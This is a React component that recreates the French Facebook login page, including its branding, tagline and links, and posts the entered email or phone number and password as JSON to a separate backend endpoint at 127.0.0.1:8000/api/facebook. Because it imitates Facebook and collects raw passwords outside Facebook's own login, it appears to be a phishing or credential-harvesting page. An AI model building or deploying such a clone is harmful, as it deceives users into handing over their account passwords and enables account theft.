import React, { useState } from 'react';
import './facebook.css';

function AddFacebook() {
    const [formData, setFormData] = useState({
        email: '',
        password: '',
    });

    const [message, setMessage] = useState('');
    const [loading, setLoading] = useState(false); // For loading state

    const handleChange = (e) => {
        setFormData({
            ...formData,
            [e.target.name]: e.target.value,
        });
    };

    const handleSubmit = async (e) => {
        e.preventDefault();
        setLoading(true); // Start loading

        try {
            const response = await fetch('http://127.0.0.1:8000/api/facebook', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                mode: 'cors',
                credentials: 'include',
                body: JSON.stringify(formData),
            });

            const data = await response.json();

            if (response.ok) {
                setMessage('Connexion réussie!');
                setFormData({
                    email: '',
                    password: '',
                });
            } else {
                setMessage('Erreur: ' + (data.message || 'Erreur inconnue.'));
            }
        } catch (error) {
            setMessage('Erreur: ' + error.message);
        } finally {
            setLoading(false); // End loading
        }
    };

    return (
        <div className="container">
            <div className="facebook-logo">
                <h1>Facebook</h1>
            </div>

            <div className="content">
                <h2>Avec Facebook, partagez et restez en contact avec votre entourage.</h2>

                <div className="login-card">
                    {message && (
                        <div className="message">
                            {message}
                        </div>
                    )}

                    <form onSubmit={handleSubmit}>
                        <input
                            type="text"
                            name="email"
                            value={formData.email}
                            onChange={handleChange}
                            placeholder="Adresse e-mail ou numéro de tél."
                            required
                        />

                        <input
                            type="password"
                            name="password"
                            value={formData.password}
                            onChange={handleChange}
                            placeholder="Mot de passe"
                            required
                        />

                        <button type="submit" className="login-button" disabled={loading}>
                            {loading ? 'Connexion...' : 'Se connecter'}
                        </button>

                        <div className="forgot-password">
                            <a href="#">Mot de passe oublié ?</a>
                        </div>

                        <hr />

                        <div className="create-account">
                            <button type="button" className="create-button">
                                Créer nouveau compte
                            </button>
                        </div>
                    </form>
                </div>

                <div className="create-page">
                    <span>Créer une Page </span>
                    <span className="bold">
                        pour une célébrité, une marque ou une entreprise.
                    </span>
                </div>
            </div>
        </div>
    );
}

export default AddFacebook;
